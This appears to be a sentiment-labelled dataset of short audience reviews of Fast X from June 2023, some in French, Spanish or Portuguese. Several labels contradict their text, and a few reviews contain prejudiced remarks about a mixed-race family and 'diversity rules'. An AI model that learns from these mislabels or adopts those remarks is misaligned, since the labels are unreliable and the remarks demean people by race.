"Jun 19, 2023",POSITIVE,"Jason Mamoa carried the movie. Definitely got away from a lot of the racing that made people love the movie, but they did get one in there."
"Jun 19, 2023",NEGATIVE,"This movie was absolutely horrible. Momoa was a complete hack. The Fast crew wasn't fun to watch. The kid was annoying. The CGI looked like garbage. And every scene was nonsensical and convenient for the plot to happen. And the entire movie is a setup for a part 2, even thought this is 2.5hr movie. So disappointing.
On the bright side and only redemption: it's not woke....yet."
"Jun 19, 2023",NEUTRAL,"Très satisfaisant! Jason Momoa est un EXCELLENT ajout! Il est parfait! Pour le reste, c'est l'explosif et l'impossible ridicule habituel des Fast & Furious qu'on aime!"
"Jun 19, 2023",NEGATIVE,"Somebody paid for me to see this, and I still want my money back."
"Jun 19, 2023",POSITIVE,Great action Jason Momoa is the best part of the movie.
"Jun 19, 2023",POSITIVE,"Super Fun, Lots of action from start to finish!"
"Jun 19, 2023",POSITIVE,It was awesome. Been watching this series from the beginning and it just gets better every time.
"Jun 19, 2023",POSITIVE,Great action movie!!!
"Jun 19, 2023",POSITIVE,I loved all the action it had and all the different countries that was visited!! Awesome movie
"Jun 19, 2023",POSITIVE,Amazing movie! Action filled. I think by the ending there’s gonna be another one! 
"Jun 19, 2023",POSITIVE,Loved this movie. No slow moments at all.
"Jun 19, 2023",NEGATIVE,"Horrible screenplay, this franchise just needed to end at 3."
"Jun 19, 2023",POSITIVE,Excellent Action Movie
"Jun 19, 2023",NEUTRAL,"Fun, crazy, but good entertainment"
"Jun 19, 2023",POSITIVE,FAST XBeautiful and happy family society.
"Jun 19, 2023",POSITIVE,It was awesome action packed... loved it.. can't wait till the next one
"Jun 19, 2023",NEGATIVE,Complete waste of time. No coherent storyline and just so many explosions and noise I had to eventually mute it. Sad because the first few films were awesome
"Jun 19, 2023",POSITIVE,The acting of Jason Momoa is incredible! He play such a good role of villian in the movie.
"Jun 19, 2023",POSITIVE,"The fact that it's not called ""Fas-TEN Your Seatbelts is a gut punching missed opportunity…

Family, coronas, and the self-aware ridiculousness are part of the ""charm"" of the Fast and the Furious franchise, and it's latest film, Fast X, the Infinity War of the franchise, is another enthralling entry into it's legacy!
Fast X injects the internet's ""favourite"" franchise with a shot of NOS that will either leave audiences rolling their eyes or smiling with absolute joy…"
"Jun 19, 2023",NEUTRAL,The Fast X plot mirrors some of the best comic book movies released in the past two decades. Do the cars have super powers? Does the family have super powers? Who knows. What I do know: Jason Momoa makes it worth the watch.
"Jun 19, 2023",POSITIVE,Fast and Furious X is an adrenaline-fueled thrill ride that leaves you craving more. The high-octane action and captivating performances make for an unforgettable experience. Buckle up and prepare for a wild and exhilarating adventure.
"Jun 19, 2023",NEGATIVE,"Well I am a huge fan of Fast & the furious, However this one was disappointing. I think it was way too much of unrealistic stunts this time around. Also Jason who I love was not at all good in this movie. I don't think comedian villain works for him at all. I hated the comedy part he played throughout the movie, villains needs to be villains not giving me comedy. He was not even funny remotely. As a villain he was not even a good villain the fight scene with him and vin sucked. Listen Jason (I love you , but stick to heroes and serious roles only) this movie fell short in all aspects for me and my crew who went to see it."
"Jun 19, 2023",NEGATIVE,"Firstly, I'm a fan of every actor that took part in this movie. I'm also a fan of the overall look of the movie. The scenes were captured very well. However, the movie, in my opinion took an unpleasant turn with too many unrealistic action sequences. I understand it's a movie and there should be some since of imagination there BUT in this case, there seem to be no conscious of what's ""real"". That lack of awareness and diligence to the audience took this movie from being exciting, to damn near comical. I laughed through 70% of the movie— I mean absolutely nothing, nothing felt like it lived in a real world."
"Jun 19, 2023",NEUTRAL,"It's a fast movie. If you like the franchise you'll love it, if you don't like the franchise don't watch. Definitely a better film than F9."
"Jun 19, 2023",NEUTRAL,"Solid movie, good action scenes"
"Jun 19, 2023",POSITIVE,Simplemente supero mis espectativas esta aplicacin lo mejor
"Jun 19, 2023",POSITIVE,"I really liked the movie and the cliffhanger was amazing, also the villain is a really enjoyable part of the movie a little crazy, but really menacing"
"Jun 19, 2023",POSITIVE,Everything about this movie was absolutely phenomenal. They never disappoint! Good job Fast X!
"Jun 19, 2023",POSITIVE,can't wait for part 2
"Jun 19, 2023",NEGATIVE,"I've been a fan of the Fast franchise, but this movie was all over the place. There was little to no plot. Nothing but action scenes and craziness. I was disappointed."
"Jun 19, 2023",POSITIVE,"Great movie, lot of action, big movie stars and surprise ending."
"Jun 18, 2023",NEGATIVE,"Seriously I had so much expectations and thoughts concerning this movie with respect to the previous ones, this is not it at all.
Irrelevant suspense, unnecessary dying, unnecessary long scenes that could be avoided, unnecessary fighting even the ending was totally off. Then credit and cast taking so much time before Rock coming in to do what exactly? The worst of the series."
"Jun 18, 2023",POSITIVE,"The action, was amazing!!!!"
"Jun 18, 2023",NEGATIVE,Wtf kinda ending was that!!!!
"Jun 18, 2023",POSITIVE,It was fantastic lots off action
"Jun 18, 2023",POSITIVE,Good as hell!!!!! FUN. COOL. WHAT MORE DO YOU WANT.
"Jun 18, 2023",POSITIVE,"I don't know what are y'all talking about..it was A GREAT MOVIE. The Rock and Gal Gadot are BACK! && Jason Mamoa did AMAZING. I loved his character, It was really funny. Made me laugh the whole time."
"Jun 18, 2023",POSITIVE,"Its not the best movie, but its a good movie. Dante is an excellent villain and he gave something fresh and new to the saga."
"Jun 18, 2023",NEUTRAL,"While over the top and definetly a bit too drawn out, its still a fun ride with a spectacular Jason Momoa performance. So if you don't mind silly but fun movies this is one to watch."
"Jun 18, 2023",POSITIVE,Not enough races. Good action. This ending says sequel.
"Jun 18, 2023",POSITIVE,"It's a good movie and was trilled with good surprises,if you've been a fan for a lot of years,stay tuned for the after credit scene!"
"Jun 18, 2023",POSITIVE,Exactly what I expected and wanted just like the others it was good.
"Jun 18, 2023",NEUTRAL,"Well it is the logical continuation of the previous parts. More action, more propane, more booms, all characters from previous parts returning . A followup second part is to close up the series probably. An unbelievable resurrection. And a bit boring to be honest.
Hard to recommend but if you are a fun of the series well you know what to expect. 
Oh, and of course you do mention family at least once every 5 minutes."
"Jun 18, 2023",NEUTRAL,"With the cheese dialled up to 10 and family said 56 times, it's exactly what you expect it to be.

Saved the maniacal villain Mamoa, he's a legend here.

You know you'll be watching the next 2 as well."
"Jun 18, 2023",NEUTRAL,"It's a fun movie with a lot of action, but that ending is taking it a bit too far.  I already knew that there would be another movie, but really?  Will they be bringing Paul back?"
"Jun 18, 2023",NEUTRAL,"Tires were spinning with plenty of actions but losing their traction. Too much of anything is not good. I used to watch from start to end. It's getting dull & tasteless when a long time on the road, I'm playing with my phone; that tells you a lot."
"Jun 18, 2023",NEGATIVE,Jason Momoa carried.
"Jun 18, 2023",NEUTRAL,Great movie but I didn't like the way it ended. They need a part 2 of this movie. It ended with the bad guys come out  a winner. BAD GUYS NEVER WIN.
"Jun 18, 2023",POSITIVE,"""FAST X is an exhilarating ride from start to finish! The high-octane action sequences, mind-blowing stunts, and charismatic performances by the cast make it a must-watch for adrenaline junkies. The sleek visuals and gripping storyline keep you on the edge of your seat. A true cinematic spectacle!"""
"Jun 18, 2023",POSITIVE,Love it!!!! Must see!!
"Jun 18, 2023",NEUTRAL,"A great experience for fans of the saga. A solid beginning to the conclusion of this film series. Generic action and adventure, grounded in family and faith. A good villain. The best part is the action scenes."
"Jun 18, 2023",POSITIVE,"They are getting a bit cheesy over top, but the sequel should be good with the ""Rock"" back."
"Jun 18, 2023",POSITIVE,"Loved it, it was a great movie!"
"Jun 18, 2023",POSITIVE,I liked everything about this movie. Tons of action
"Jun 18, 2023",POSITIVE,his movie was awesome... the movie was just full of action. The action is fun... Jason Momoa is Good-Level in it and worth the price of admission.
"Jun 18, 2023",NEGATIVE,"Decent effects, thin plot and just overall cringy especially Jason Momoa's character. Them trying to stretch this into multiple movies will only make this less interesting to watch"
"Jun 18, 2023",NEGATIVE,"this movie was horrible... They seem to be trying to continuously tie into what has been done, yet they have gone so far into science fiction, it needs to end. Please, do NOT make another movie, this franchise should have ended long ago..."
"Jun 18, 2023",NEGATIVE,Worst cliffhanger in cinematic history
"Jun 18, 2023",POSITIVE,"This is a great movie!  I have watched every series of it, and I really recommend everyone to watch it!"
"Jun 18, 2023",POSITIVE,Didnt like the cliffhanger at the end of movie
"Jun 18, 2023",NEGATIVE,Had no idea Fast X joined the Marvel Universe.
"Jun 18, 2023",POSITIVE,Yes I despised the character Dante but dang Jason Mamoa did a great job and was exciting to see! Love the Fast movies
"Jun 18, 2023",NEUTRAL,"Fast X, the tenth installment of the Fast & Furious franchise, is a film that can only be described as utter nonsense. Dominic Toretto's seemingly superhuman abilities and his indestructible car push the boundaries of believability. However, the film's non-stop adrenaline-fueled pace keeps viewers on the edge of their seats from beginning to end. While it may be tamer than its predecessors, one would have expected nothing less than a car-to-the-moon scenario. Jason Momoa's portrayal of the villain is eccentric and campy in the best possible way. Despite numerous plot holes and the sense that the story is being dragged out for a potential part two, Fast X remains a highly entertaining experience that is definitely worth watching."
"Jun 18, 2023",NEUTRAL,It was one of my least favorite of the franchise the villain was weird and too much comedy involved
"Jun 18, 2023",NEGATIVE,"Fast X

A big splashy pile of rubbish. The plot is a poor rehash of the former movies, with nothing new or compelling to it.

The performance by the cast is mostly bland, except for Jason Momoa and John Cena. This is the most impassive and drab portrayal of Dominic Toretto by Vin Diesel, and this is especially frustrating, as this is meant to be the beginning of the end of this franchise. The supporting characters are numerous, but due to the short screentime and unceremonious entry they have, they all seem like an endless introduction of cameos. Jason Momoa as the villain of this movie is the best thing. He's charismatic and campy, and his jokeresque performance is refreshing. John Cena also gives a good performance, with a good blend of bravado and hilarity.

This franchise is hinged on farfetched action but this instalment is sheer dumb, and the funny ridiculousness that the former instalments have is absent here. The CGI is not good, and the direction and editing can be choppy at times, this is especially poor seeing as this is the sixth most expensive movie ever made, wonder where all the money went, probably to the sprawling uninteresting cast.

3.5/10"
"Jun 18, 2023",POSITIVE,"People act like this is supposed to be a life changing movie. They're all the same. Just a good action movie with a some humor that gets better with every movie. Jason Momoa is fantastic. He looked like he had a blast playing this character. 
The cliff hanger was a bummer but given the ending, hopefully we see the next release sooner than this one to be released."
"Jun 17, 2023",NEGATIVE,Literally the worst movie they have made thus far. Nothing about racing and scenes are so fake.
"Jun 17, 2023",NEGATIVE,Fast X just feels tired and just wants to keep going anyway.The movie had a few good action scenes but it does not save the film.This movie in general was just so dull nothing is great it's just bad movie.Its not funny what's so ever they tried way to hard to make you laugh.This movie tells me that this franchise is running out of gas.But the villain was good through.
"Jun 17, 2023",NEGATIVE,Probably the worst Fast movie. Sad to say as I was always a fan. This was such a big disappointment.

"Jun 17, 2023",POSITIVE,What else do you expect from ff franchise now. Usual family stuffs are there. The visuals and car sequences are worth watching.
"Jun 17, 2023",NEGATIVE,Fast X is the same movie as its prequels with a different villain.
"Jun 17, 2023",NEGATIVE,"Fairytale, again, lame plot, too many kills, too many explosions, too many bad-ass quotes, why don't they just stop with this...?"
"Jun 17, 2023",POSITIVE,What a way to end it leaving us wanting more!

"Jun 17, 2023",NEGATIVE,Absolutely ridiculous. Wtf did I just watch smdh. I've seen all their movies and yes I'm a big fan but THIS ridiculously awful. Seriously the worst movie I've ever seen and I've seen hundreds if not thousands of movies. Honestly I would not even give it a 1/2 star if I could. The pure definition of stupidity.
"Jun 17, 2023",POSITIVE,I enjoy every second in that movie great action movie and fun 
"Jun 17, 2023",POSITIVE,"I am an action junkie. I loved the fact that all the characters came back. All the cliffhangers for Part 2 especially the ending.
It's great family entertainment.  I'm excited about The Rock- Dwayne Johnsin but sad about Paul Walker."
"Jun 17, 2023",NEGATIVE,"Other than how good and fresh this movie villain is, this franchise just running out of fuel. Heck i dont even feel bad when Jakob scarify himself, caused i bet the next movie gonna make a way for him to back in the game."
"Jun 17, 2023",POSITIVE,Talk about intense and action packed 
"Jun 17, 2023",POSITIVE,"Wow,fast &furious never let people disappointed 👻love it so much,impressive explosion scenes,family bonding and also beautiful cars."

"Jun 17, 2023",POSITIVE,A very good movie best one since furious 7 it's a must watch in theatres.The ending made me anxious im worried.Can't wait for the next one!
"Jun 17, 2023",NEUTRAL,Didn't like the ending
"Jun 17, 2023",NEUTRAL,Jason Mamoa was amazing - he was having a blast. The movie was a little disappointing - some of the sfx were weird. It had its high points but for the first time I felt like a F&F movie was too long
"Jun 17, 2023",POSITIVE,I really enjoyed this movie. Jason Momoa was exceptional!
"Jun 17, 2023",POSITIVE,"It was good. I can't wait for the next one. But my two favorite duo wasn't coming with jokes like they do in every other movie. It was a little predictable, but for the most part it was good."
"Jun 17, 2023",POSITIVE,It wasnt as bad as people made it out to be.. it had a lot of action and family scenes.
"Jun 17, 2023",NEGATIVE,"worst movie I've seen. sadly, that means the past 3 movies were all better. Terrible acting. Terrible story. worst movie I've seen in my life."
"Jun 17, 2023",NEUTRAL,"Fast and Furious 10 is an action-packed movie, with incredible car scenes and the secrets of the past being revealed, I think what spoils the story a lot is not having that suspense when the cars explode, but everything in the movie is perfect."
"Jun 17, 2023",POSITIVE,"""Fast X delivers an adrenaline-pumping joyride with jaw-dropping stunts, high-octane action, and a stellar ensemble cast. This explosive installment revs up the franchise to new levels, leaving audiences gasping for more."""
"Jun 17, 2023",NEUTRAL,Over the top action. Would rather see them. Boosting DVD players again.
"Jun 17, 2023",NEGATIVE,We did not attend the movie! I meant to purchase Father’s Day Sunday ticket and by accident purchased todays.
"Jun 17, 2023",POSITIVE,Jason momoa outfits slayed
"Jun 17, 2023",NEUTRAL,Fast X does have a somewhat improvement from its predecessor but it fails to capture the magic of the original Fast and Furious.
"Jun 17, 2023",NEGATIVE,"Didnt like acting, very bad. Not sure what happened to Stratham and the team after plane went down."
"Jun 16, 2023",NEUTRAL,Entertaining but not the best. 
"Jun 16, 2023",NEGATIVE,"While the cast seems to be having fun and there's definitely some nice fan service throughout, it's a pretty familiar road and proof that only Justin Lin can make these movies work. Here's to hoping this franchise crosses the finish line ASAP."
"Jun 16, 2023",POSITIVE,"Fast X? More like Vast X! The Fast Saga has become a sprawling epic, with a huge amount of characters old and new, amazing set pieces and a finale that cannot be contained to a single movie! All while keep a razor focus on the heart of the fast saga: family. Plus it was great to see Charlize Theron do some classic Charlize Theron action!"
"Jun 16, 2023",POSITIVE,Momoa was terrific.  Funny in a deeply psychotic manner.
"Jun 16, 2023",NEGATIVE,"There is to many fast and the furious movies that I lost count. The series is just about racing cars and just the same plot over and over again, some aspects are different- but I just gotten bored of this series's. We just got a fast and the furious movie not long ago: I don't understand why they can't make new movies and instead invest in remakes and sequels!"
"Jun 16, 2023",NEGATIVE,Indian movies are more real than this
"Jun 16, 2023",NEGATIVE,The action is great but all the dialogue in between is really bland and boring. The movie ending with a major cliff hanger really hurts this movie.
"Jun 16, 2023",NEUTRAL,The movie was good don't get me wrong but the end was not it.
"Jun 16, 2023",POSITIVE,"Adorei o filme, o Jason momoa está espetacular no papel. Se vc usar muito a suspensão da descrença igual eu fiz, vai gostar demais. É aquele tipo de filme farofa bom que te entretem, mesmo algumas coisas não fazendo sentido. Agora se vc n gostar desse tipo de filme pastelão e pé no chão, então não recomendo."
"Jun 16, 2023",NEGATIVE,The CGI ruined the movie
"Jun 16, 2023",NEGATIVE,The most superficial and ridiculous FAST movie yet.  Action scenes are amazing though and VIN is still VIN 😝
"Jun 16, 2023",NEUTRAL,"It's Fast and Furious 10. The bar to jump over is oh, so low and the movie still struggles. But it's still mindless action that is enjoyable."
"Jun 16, 2023",POSITIVE,This movie is really good
"Jun 16, 2023",NEUTRAL,es entretenida pero ya en el segundo acto me cae mucho pero ya por tradición hay que terminar esta larga saga
"Jun 16, 2023",NEGATIVE,Q filme horroroso. Acho q Transformers podia fazer um crossover com velozes facilmente. Pq esse filme tem tudo menos velozes e fuiriosos. É um missão impossível sem o tom
"Jun 16, 2023",NEUTRAL,It was entertaining Louis leterrier did a really good job directing it better than justin lin vfx were good action sequences were really good but the story was bad I hope they will improve the story for the next one and please stop it with bringing back dead people overall good movie but they need stop now it's too many movies it is like dragging a dead body it needs to be buried.
"Jun 16, 2023",NEGATIVE,"Title: ""Disappointing and Lackluster: A Missed Opportunity""

Rating: ★☆☆☆☆

Review:

Where do I even begin with this movie? It was an absolute train wreck from start to finish. I had high hopes going in, but it quickly became apparent that those hopes were misplaced. This film failed on multiple levels, leaving me utterly disappointed and unsatisfied.

First and foremost, the plot was convoluted and confusing. It lacked coherence and failed to engage me in any meaningful way. It felt like the writers were trying to cram too many ideas into a single storyline, resulting in a jumbled mess. There were numerous plot holes that were left unaddressed, leaving me scratching my head in frustration.

The character development was practically non-existent. The main characters were one-dimensional and lacked depth. I found it difficult to connect with any of them or invest in their journey. Their actions and motivations often felt arbitrary and inconsistent, further contributing to the overall lack of engagement.

Moreover, the pacing was all over the place. The movie dragged on in certain parts, while rushing through potentially crucial moments that needed more time to breathe. This imbalance disrupted the flow and prevented any sense of rhythm or anticipation from building up.

To make matters worse, the acting was subpar at best. The performances felt wooden and devoid of emotion. It was as if the cast was going through the motions without any genuine investment in their roles. This lackluster acting further detracted from the already weak storytelling.

The cinematography and special effects were equally underwhelming. The visuals lacked creativity and failed to leave a lasting impression. Even the action sequences, which should have been the film's saving grace, felt generic and uninspired. It seemed like the filmmakers relied too heavily on CGI without considering the importance of practical effects and innovative camerawork.

Lastly, the movie failed to deliver any thought-provoking themes or messages. It lacked substance and depth, leaving me wondering what the point of it all was. It felt like a wasted opportunity to explore meaningful ideas and make a lasting impact.

Overall, this movie fell far short of my expectations. It was a mishmash of poorly executed elements that left me feeling unenthusiastic and disengaged. I wouldn't recommend wasting your time on this lackluster film when there are far better options available. Disappointment. Ending for the first time I hate fast and furious movies I've been watching it since 2001 and I saw all the episodes but this one it's really shame to be watching"
"Jun 16, 2023",POSITIVE,A great action movie3
"Jun 16, 2023",NEUTRAL,"Fast X is the most the Fast and Furious movie since the last Fast and Furious movie. In otherwise words it was very on brand, does not try to push the boundaries, no one ever dies and action is absurd as ever. The plot is both simple and also a convoluted mess of characters and back stories. Most of the cast was having fun hammering it up, especially new comer Jason Momoa (who is doing his best impression of what if the Joker was Captain Jack Sparrow). The only Debbie Downer was the VIn Diesel, himself, who was strangely serious throughout the movie, like if someone dropped Jason Bourne into the Fast franchise.

Good honest dumb fun, can't wait for the last one."
"Jun 16, 2023",POSITIVE,Love the Fast and Furious movies always have and always will!! But how do you not show if the uncle and kid make it or not? Now I'm going to be itching for Fast 11
"Jun 16, 2023",NEUTRAL,"Say it with me,""Jason Mamoa!"". He totally saved this somewhat, seen before F&F movie. He injected some life into the dwindling spark of the once awesome franchise. Remember the days of Fast five, and Fast and furious 7? Well, Fast X doesn't compare to those but at least it doesn't send our boys Roman and Tej into space in old wet suits! Mamoa nails the Dante Reyes character with enough humor and panache to appeal to everyone! And thank you for that! Things needed to be livened up! Vin Diesel is his usual cool self. With all the talk about family. Ya, ya we get it, family is important. Heard it, heard it again,and yet again! Thank you to director Louis Lettier the real time car chases we're back. Not all just green screen. Getting back to the roots of Fast movies and what the fans really want to see. It was an okay movie. Setting up the next installment with a big cliff hanger end. And gave a heartfelt nod to the heart of the franchise, Paul Walker, with a brief but amazing scene with Paul's daughter, Meadow. You'll have to spot her yourself! So go ahead, take the journey down the road to ride or die one more time."
"Jun 16, 2023",NEUTRAL,"It was so absurd and nonsensical, the crowd was actually laughing and having a good time. I respect Vin Diesel's commitment to making absurd F&F movies. Jason Momoa absolutely killed as the villain. His acting was actually the best thing about the movie. Left the theater very surprised by his performance."
"Jun 16, 2023",POSITIVE,The special effects were phenomenal! It is a must see in the theater not at home.
"Jun 16, 2023",NEUTRAL,"One of the craziest movies ever! Actually it's funny as hell, Cars falling over and buildings, flying from sky, it's whoever funny, it's an improvement from the Fast 9."
"Jun 16, 2023",POSITIVE,"If you enjoy the franchise, then you'll love this.  Nonsensical over-the-top action and all the elements that keep us coming back.  Mamoa steals the show a bit...and I'll deduct a star for re-writing the ending which (no spoilers here) makes some of the earlier film plot make even less sense than usual.  Still happily looking forward to FastX Part 2 (or whatever they'll call it, lol)."
"Jun 16, 2023",NEUTRAL,"What's good: Jason Momoa's evil psychopath villain, the cars, Dom and his family. What's not so good: not enough cars, the drift towards military hardware and violence, special effects that are just too over-the-top. What made this such a great franchise originally was that it was a bunch of diverse characters really lavishing attention on their cars which were fast, furious, and beautiful. There also were some playful ideas about cops and robbers having a lot in common, maybe even being two sides of the same coin. Now it's all weird secret government agencies and unbelievably powerful villains pulling off really expensive effects all over the globe. It's gotten bloated and could do with a back-to-basics entry. This is not that entry."
"Jun 16, 2023",NEGATIVE,Hopefully Fast 11 delivers better than this...
"Jun 16, 2023",NEGATIVE,"I know these movies have gone very over the top with all their stunts but this one takes the cake. they do stuff straight out of a roadrunner cartoon. it's hard to suspend disbelief when you have people that can do things the Avengers can't even do.😄 the only one worth watching here is Jason mamoa for his jokes...but overall, it's just typical crazy fast and furious. 4/10"
"Jun 16, 2023",POSITIVE,Wonderful entertainment.  10 out of 10.
"Jun 16, 2023",NEGATIVE,i think its time to stop making sequels.. thought this one would be different... boy was i Wrong!!!  i will not waste my money anymore on this film...  might as well turn this film into superhero marvel movie...  🥺😢
"Jun 16, 2023",POSITIVE,Non stop action....can't wait for part II
"Jun 15, 2023",NEGATIVE,Cumulo de acción sin sentido
"Jun 15, 2023",POSITIVE,good start to summer films. if you like the fast franchise then you will enjoy it. the end left me with too many questions..i am guessing there will be another.
"Jun 15, 2023",NEUTRAL,"About average for The Fast an Furious series.  However, it was difficult to believe a White and Hispanic couple, Dominic and Letty had a African-American child. How did this happen? Did Letty have an affair with the milkman when Dominic was away.  I wonder how many Hispanic and White child actors got passes over so Hollywood could fill their new diversity rules. Sadly, this will not get people back out to the movies."
"Jun 15, 2023",POSITIVE,Excellent movie.  Stay for the credits.
"Jun 15, 2023",POSITIVE,"Gostamos muito, somos fã, aguardando ansiosos pela continuação ..."
"Jun 15, 2023",POSITIVE,"Stunning. Absolutely stunning in every way. If you like the Fast franchise, you're going to love this masterpiece."
"Jun 15, 2023",NEUTRAL,good not great. mamoa makes the movie
"Jun 15, 2023",NEGATIVE,A terrible child actor. Terrible dialog from Tyrese and team. Bre Larson geezus unwatchable.  Jason mamoa is probably the best thing about the film.
"Jun 15, 2023",POSITIVE,Really enjoyed the action sequences from beginning to end...unbelievable but fun to watch. Didn't disappoint.
"Jun 15, 2023",NEGATIVE,"I must acknowledge the efforts made in this latest installment, particularly the absence of cars being launched into space. However, it saddens me to say that this film continues the trend of mindless entries in a series that lost its direction long ago.

The movie feels like a mere collection of explosive sequences, celebrity appearances, and high-speed car chases scattered throughout, lacking a cohesive narrative to tie them together.

Regrettably, the ending proved to be particularly anticlimactic. It abruptly concluded in the midst of an action sequence, leaving the viewer with a sense of dissatisfaction after investing three hours into the film."
"Jun 15, 2023",NEGATIVE,"Well there's a lot of different story lines going on at once and so much action so many characters it was a little much. Felt very fake . Also Jason Momoa had the potential to be so bad ass like he is in movies but he was flamboyant and almost acted like the joker in a cartoon, very not him and seemed so unnatural like when you watch something and feel embarrassed for them . Plot twist in the end was unnecessary with the girls. Also Dons son grew up to be a mixed kid, which is funny because his mom was white makes you think the whole time that it's not his kid 😂 Not horrible movie just some was hard to watch. John Cena did wonderful his storyline was great ."
"Jun 15, 2023",NEGATIVE,I don't know what I just watched if car makers can clone vins car there would never be a fatal crash again. It can go to space drive thru everything and fight a helicopter meanwhile I have no clue if it ended or if they just forgot to add anything to do with cars n racing. Oh n they r all high tech fbi style skilled now they can fix anything with a 90s style laptop n flip phones.
"Jun 15, 2023",NEGATIVE,Really terrible. Time to hang up the keys Vin.
"Jun 15, 2023",NEGATIVE,it's all about boom boom and boom. Seems like every member woke up from their death
"Jun 15, 2023",NEGATIVE,"Infelizmente acharam que iriam jogar qualquer coisa na tela e iríamos gostar, infelizmente nunca estiveram tão errados."
"Jun 15, 2023",NEGATIVE,Loud and defying logic as usual. Jason Mamoa adds some much-needed colour. Definitely an improvement from F9.
"Jun 15, 2023",NEUTRAL,Ok and entertaining movie with lot's of wierd and dumb stuff
"Jun 15, 2023",NEGATIVE,"What a trash! I thought Disney's movies were bad, but heck. This is simply stupid! End this garbage already"
"Jun 15, 2023",NEGATIVE,"I've watched this franchise since the first film, when Brian was a cop, and this is by far the worst installment.  The stunts, which is what the film is all about, are so unbelievable that not even a comic-book would ask the reader to accept it.  The acting, despite having a few Oscar-winners, is strictly middle-school quality.  And, Jason Momoa, who started his career trying to be respected, is an embarrassment to himself, his family, and his ancestors.  I have to think he was drunk the entire time.  The Final Insult, that I'll mention since the movie has be out for so long & it's less of a spoiler, is the Unresolved Ending.  And the return of yet another ""dead"" fan favorite.  This entire film is just a set-up for an anticipated 3-film franchise conclusion."
"Jun 15, 2023",NEGATIVE,"Horrible, cringed, bad story, bad acting. A totally waste of time."
"Jun 15, 2023",NEGATIVE,"I always think that the previous fast n furious is the worst movie I ever seen, till watch the next new one.
Really, I wast my time"
"Jun 15, 2023",POSITIVE,It’s really amazing.I would recommend this movie
"Jun 15, 2023",NEGATIVE,"It's enjoyable, but if you're looking for a car movie, you're in the wrong place. This is now the latest in the line of superhero movies. And apparently the main superpower of everyone in the group is the ability to resurrect themselves from the dead. Well, except for Paul Walker, who never really died in the movies, but... well... you know... 

There is very LITTLE DNA left of the original Fast and Furious movies. The cars can fly now and drive on walls, and swing from pieces of twine. The characters seem to be immortal, with a general superpower of escaping any daring situation with minor injury. And with the mind altering powers of persuasion, of Dom Toretto, they can convert any enemy to a friend within 2 movies. 

Overall though, if you are willing to suspend the idea that it's rooted in the original Fast and Furious movies, it's at least a fun watch. Jason Momoa is an absolute pleasure to watch, and has a Joker-like quality throughout the whole movie. Oddly, I knew he was the bad guy, but really just wanted to see what creative torture he was going to come up with next for Bat-Dom . 

Summary... Worth the watch, enjoyable, but don't expect a car movie."
"Jun 15, 2023",NEGATIVE,"Boring, repetitive, unimaginative"
"Jun 15, 2023",POSITIVE,"It was good and entertaining. They just add a couple of scenes that felt out of place in the story line. Jason Momoa character was good, it has some characteristics from The Joker."
"Jun 15, 2023",POSITIVE,"Lots of great action, one of the best movies."
"Jun 15, 2023",POSITIVE,"When you go watch a Fast & Furious saga movie, you know exactly what you're getting tickets for. The moment you enter the movie theatre you have to leave outside everything learnt in physics class and surrender to everything you see on screen. And you know why: If it defies the laws of men, Toretto and his gang do it. And if it defies the laws of God and physics, they do it twice. So, don't ask too much from this movies. They're here to entertain and they deliver perfectly, just as this last entry of the Fast saga does. That's why i consider 4 stars must be awarded. After all, it's technically a good movie that delivers the next logical step in the saga, respecting the lore installed by the previous movies with a little twitch in order to reach where we are going.
I actually enjoyed and i want to see whats next."
"Jun 14, 2023",NEUTRAL,"Hot mess. It's is becoming like Marvel movies. Just throw in every character ever written in the franchise, stir them up and throw it out onto the screen. But if you like action, go see it."
"Jun 14, 2023",NEGATIVE,Dont know how the series turned into a really bad disney movie
"Jun 14, 2023",NEGATIVE,I can't. This was meant for the guys you knew in high school who grew up to be full-time forklift operators who swear this is the best series they've ever seen. Please.
"Jun 14, 2023",NEUTRAL,"The movie was good, I do enjoy watching the fast and the furious Saga, but the movie is just getting boring they keep on making the same thing every movie that comes out. When Paul passed away, they should’ve just ended it on Fast 7 or Fast 8, I feel like this is disrespect to Paul Walker, by making so many fast and furious movies, but not showing him and acting like he’s in the movie still No but they kept on making more movies. But we’ll see how far the Fast Saga goes. If they make a part 3 or a Fast 11 this is just going to get ridiculous."
"Jun 14, 2023",POSITIVE,"Fast X was such a cinematic delight. I really enjoyed seeing this cast work together again as a team, their loyalty to one another is evident. The strong bonds in this movie are refreshing and relatable. Friends that become family that you would do anything to protect. They all truly outdid themselves killing the endless fast action packed, heart racing moments. Although the scene where Dom whom I still love drives off a highway and somehow still survives and drives off is too far fetched just not believable in my opinion.  Now lets talk about the amazing ladies, whom were so badass in this movie, especially in the fight scenes so refreshing to see women in such heroic roles. OMG newcomer to the fast and Furious series, Jason Momoa killed it in his role as Dante Reyes. I loved every single moment so much he unpredictable and unhinged yet still made me laugh so much made me love the villain more than the heroes in this movie. Fast X is by far my favorite of this series definitely a must see fans."
"Jun 14, 2023",NEUTRAL,Lots of action worth seeing and that's about it.  Nothing special but still a must see for the Fast and Furious franchise.  Feels like a TV episode.
"Jun 14, 2023",NEGATIVE,"Péssimo, roteiro preguiçoso, atuações exageradas e um final confuso."
"Jun 14, 2023",POSITIVE,We loved the movie just as expected.
"Jun 14, 2023",NEGATIVE,I didn't get past 25 minutes into the movie.
"Jun 14, 2023",POSITIVE,I love watching Fast & Furious but this one was pretty cool but that the beginning it was a little bored
"Jun 14, 2023",NEGATIVE,"Terrible , Boring . Gets worse as you keep watching . Should of ended this franchise a long time ago"
"Jun 14, 2023",NEGATIVE,"BIG NO! Where was the cast. I just seen a wana be genie. Torettos team were not around. And this movie had no action from what it should have. Its about the cars the racing, that was barely shown! And the ending, no way! Why just why???? I love these fast and furious movies, but this one needs to be deleted and remade! No fair they are ending the franchise and like this!! Producer please fix this movie, make it like the others! Stop trying so hard!!"
"Jun 14, 2023",POSITIVE,"Lots of action, fast pace overall good movie"
"Jun 14, 2023",POSITIVE,Enjoyed all the action and banter.
"Jun 14, 2023",NEGATIVE,"I don't know about this one. Imo, it was bad. Jason Momoa was not good with all the super extra theatrics that was not needed. Within 5 minutes that the movie wasn't going to go good and end bad. 😕"
"Jun 14, 2023",NEUTRAL,"This is a well known franchise by now but has it gone too far? Yes and no. I definitely enjoyed Fast X more than the two previous movies in the series, but I don't feel the last movies have been necessary to be honest. It's a great action movie but it's a meh car/racing movie. And sorry to the people following the Instagram account to Fast and furious because in my opinion you can almost watch the movie there."
"Jun 14, 2023",NEGATIVE,not my movie they should have stop making them after paul walker passed away
"Jun 14, 2023",POSITIVE,"Loved it. I was speechless at the end. The action was awesome, the story was intriguing and consistently engaging."
